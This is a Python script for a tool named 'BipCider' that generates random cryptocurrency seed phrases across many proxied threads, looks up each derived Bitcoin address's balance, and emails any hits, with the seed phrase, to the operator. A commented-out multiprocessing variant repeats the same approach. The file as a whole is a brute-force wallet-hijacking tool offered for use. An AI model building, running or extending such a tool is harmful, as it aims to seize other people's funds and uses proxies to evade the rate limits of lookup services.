import time
import pyfiglet
from utils.wordlist_cache_generator import wordlist_cache_generator
wordlist_cache_generator()
time.sleep(1) # To ensure the cache is generated before importing BitUtils
import threading
from dotenv import load_dotenv
from utils.bit_utils import BitUtils
from utils.email_utils import EmailUtils
from utils.proxies import proxies

load_dotenv()
bitUtils = BitUtils()
emailUtils = EmailUtils()
start_time = time.time()
lock = threading.Lock()

total_checks = 0
failed_checks = 0
if len(proxies) > 0:
    max_threads = len(proxies) * 12 # Maximum number of threads to run per iteration
else:
    max_threads = 10  # Maximum number of threads to run per iteration


# email warning system
email_warning_count = 0
last_warning_email_time = 0
warning_email_lock = False

text = pyfiglet.figlet_format("BipCider")
print(text)

def run_cycle(cycle_number):
    global total_checks, failed_checks, email_warning_count, last_warning_email_time
    seed_phrase = bitUtils.seed_phrase_listgen()
    # Check address & its balance
    address, balance = bitUtils.check_btc_seed(seed_phrase)
    # with lock: # Prevents ZeroDivisionError but slows down the process
    #     total_cycles += 1
    total_checks += 1
    if balance is not None:
    # if False: # For testing purposes
        if balance > -1:
            message = f"Cycle {total_checks if total_checks > max_threads else cycle_number} - Address: {address}, Balance: {balance} BTC, Seed Phrase: {seed_phrase} \n{'-' * 40}"
            print(message)

            emailUtils.send_phrase(
                total_checks= total_checks if total_checks > max_threads else cycle_number, # Display total_cycles if less than max_threads, else display cycle_number
                address= address, 
                balance= balance, 
                seed_phrase= seed_phrase)

    else:
        failed_checks += 1
        print(f"Cycle({cycle_number})[{failed_checks} failed] - Could not retrieve balance.\n{'-' * 40}")
        # Warn user of low success rate
        success_rate = 0 if total_checks == 0 else (1 - (failed_checks / total_checks)) * 100
        if success_rate < 85:
            current_time = time.time()

            with lock:  # Ensure only one thread sends the email
                if email_warning_count < 5 and (current_time - last_warning_email_time >= 1800):  # 30 minutes = 1800 seconds
                    emailUtils.send_warning(
                    total_checks=total_checks if total_checks > max_threads else cycle_number,
                    success_rate=success_rate
                    )
                    email_warning_count += 1
                    last_warning_email_time = current_time
                    print(f"Warning email sent. Warning count: {email_warning_count}, \nLow success rate: {success_rate:.2f}%")



try:
    print("Press Ctrl+C to stop the process")
    while True:
        threads = []

        for cycle_number in range(max_threads):
            thread = threading.Thread(target=run_cycle, args=(cycle_number + 1,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()
            
except KeyboardInterrupt:
    end_time = time.time()
    success_rate = 0 if total_checks == 0 else (1 - (failed_checks / total_checks)) * 100
    print(f"Total checks: {total_checks}, Failed checks: {failed_checks}, Success rate: {success_rate:.2f}%")
    print(f"Execution duration: {end_time - start_time:.6f} seconds")
    # Send termination email
    emailUtils.send_terminated(total_checks, 
                               failed_checks,
                               success_rate, 
                               termination_time=end_time - start_time,
                               )



# from multiprocessing import Pool, Value, Lock
# import time
# from utils.bit_utils import BitUtils

# bitUtils = BitUtils()
# start_time = time.time()
# total_cycles = Value('i', 0)
# failed_cycles = Value('i', 0)
# lock = Lock()

# def run_cycle(cycle_number):
#       global total_cycles, failed_cycles
#       seed_phrase = bitUtils.seed_phrase_listgen()
#       address, balance = bitUtils.check_btc_seed(seed_phrase)
#       with lock:
#            total_cycles.value += 1
#       if balance is not None:
#         # if balance > 0:
#             print(f"Cycle {cycle_number} - Address: {address}, Balance: {balance} BTC, Seed Phrase: {seed_phrase} \n{'-' * 40}")
#       else:
#            with lock:
#                 failed_cycles.value += 1

# if __name__ == "__main__":
#       try:
#            num_cycles = 500000
#            with Pool(processes=4) as pool:  # Adjust the number of processes based on your CPU cores
#                 # pool.map(run_cycle, range(num_cycles))
#                 for _ in pool.imap_unordered(run_cycle, range(num_cycles)):
#                     pass
#       except KeyboardInterrupt:
#            end_time = time.time()
#            success_rate = 0 if total_cycles.value == 0 else (1 - (failed_cycles.value / total_cycles.value)) * 100
#            print(f"Total checks: {total_cycles.value}, Failed checks: {failed_cycles.value}, Success rate: {success_rate:.2f}%")
#            print(f"Execution time: {end_time - start_time:.6f} seconds")
